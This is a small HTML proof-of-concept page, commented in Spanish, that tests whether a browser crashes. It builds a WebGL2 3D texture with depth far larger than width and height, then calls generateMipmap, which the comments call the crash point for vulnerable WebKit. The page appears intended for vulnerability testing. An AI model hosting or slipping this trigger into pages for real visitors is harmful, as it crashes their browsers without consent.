<!DOCTYPE html>
<html>
<head>
  <title>WebGL3D Mipmap Crash Test</title>
  <style>body { background: #000; color: lime; font-family: monospace; }</style>
</head>
<body>
  <h1>WebGL3D Mipmap Crash PoC</h1>
  <p>Si tu navegador es vulnerable, puede colapsar ahora.</p>
  <script>
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl2");

      if (!gl) {
        document.body.innerHTML += "<p style='color:red'>WebGL2 no disponible</p>";
        throw "WebGL2 no soportado.";
      }

      const tex = gl.createTexture();
      gl.bindTexture(gl.TEXTURE_3D, tex);

      const width = 4;
      const height = 4;
      const depth = 64; // <<<< Aquí está el crash: depth >> width/height

      const levels = Math.floor(Math.log2(Math.max(width, height, depth))) + 1;
      const data = new Uint8Array(width * height * depth);

      gl.texImage3D(
        gl.TEXTURE_3D,
        0, // mip level
        gl.R8,
        width,
        height,
        depth,
        0,
        gl.RED,
        gl.UNSIGNED_BYTE,
        data
      );

      gl.texParameteri(gl.TEXTURE_3D, gl.TEXTURE_MIN_FILTER, gl.LINEAR_MIPMAP_LINEAR);
      gl.texParameteri(gl.TEXTURE_3D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);

      // 💣 Aquí se forza el crash si WebKit es vulnerable
      gl.generateMipmap(gl.TEXTURE_3D);

      document.body.innerHTML += "<p style='color:lime'>Mipmap generado sin crash</p>";

    } catch (e) {
      console.error(e);
      document.body.innerHTML += `<p style='color:red'>Error: ${e}</p>`;
    }
  </script>
</body>
</html>
